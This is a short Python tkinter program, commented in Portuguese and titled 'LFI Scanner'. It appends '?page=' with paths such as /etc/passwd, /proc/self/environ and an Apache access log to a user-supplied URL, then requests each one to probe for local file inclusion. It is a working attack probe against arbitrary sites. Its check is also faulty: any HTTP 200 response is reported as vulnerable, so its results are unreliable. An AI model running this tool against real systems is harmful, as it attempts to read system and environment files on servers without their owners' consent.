import tkinter as tk
from tkinter import ttk
import tkinter.font as font
import requests

def run_scan():
    pb.start(100)
    root.update()
    # usuario informa a URL
    url = entry.get()
    
    # lista de arquivos para scan, vulnerabilidades LFI
    files = ["/etc/passwd", "/proc/self/environ", "/var/log/apache2/access.log"]
    
    # loop na lista de arquivos
    for file in files:
        # construindo a URL completa
        test_url = url + "?page=" + file
        update_progress_bar()
        # fazendo o request na URL
        response = requests.get(test_url)
        # checando o codigo de resposta do request
        if response.status_code == 200:
            # se a resposta for 200, o codigo é acessavel
            result_label.config(text=result_label.cget("text") + f"[+] VULNERÁVEL: {test_url}\n")
        else:
            # se o status nao for 200, o codigo não é acessavel
            result_label.config(text=f"[-] Não VULNERÁVEL: {test_url}")
    pb.stop()
            
def reset_scan():
    result_label.config(text="")
      
def update_progress_bar():
    pb["value"] = pb["value"] + 10
    if pb["value"] <= 100:
        root.after(100, update_progress_bar)
    else:
        pb["value"] = 0


# criando a janela GUI
root = tk.Tk()
root.geometry("900x400")
root.title("LFI Scanner")
root['bg'] = 'black'

# criando o input
url_label = tk.Label(root, text="URL:", bg='#000000', fg='#5bff45')
url_label.grid(row=0, column=0, sticky="W", padx=10,pady=10)

# criando a entrada de texto
entry = tk.Entry(root)
entry.grid(row=0, column=1, columnspan=2, padx=10, pady=10, sticky="E")

#barra de progresso
pb = ttk.Progressbar(root, orient='horizontal', mode='indeterminate', length=280)
pb.grid(row=1, column=0, columnspan=3, padx=10, pady=10, sticky="nsew")

# criando um botão pra começar o scan
myFont = font.Font(family='Courier', weight='bold')
scan_button = tk.Button(root, text="Scannear", command=run_scan, font=myFont, bg='#000000', fg='#5bff45', activebackground='#787878')
scan_button.grid(row=2, column=0, padx=10, pady=10, sticky="e")

# botao de resetar o scanner
stop_button = tk.Button(root, text='Resetar', command=reset_scan, font=myFont, bg='#000000', fg='#5bff45', activebackground='#787878')
stop_button.grid(row=2, column=1, padx=10, pady=10, sticky="w")

# criando um rotulo que mostra o resultado
result_label = tk.Label(root, text="")
result_label.grid(row=3, column=0, columnspan=2, padx=10,pady=10, sticky="nsew")

# startando a GUI
root.mainloop()
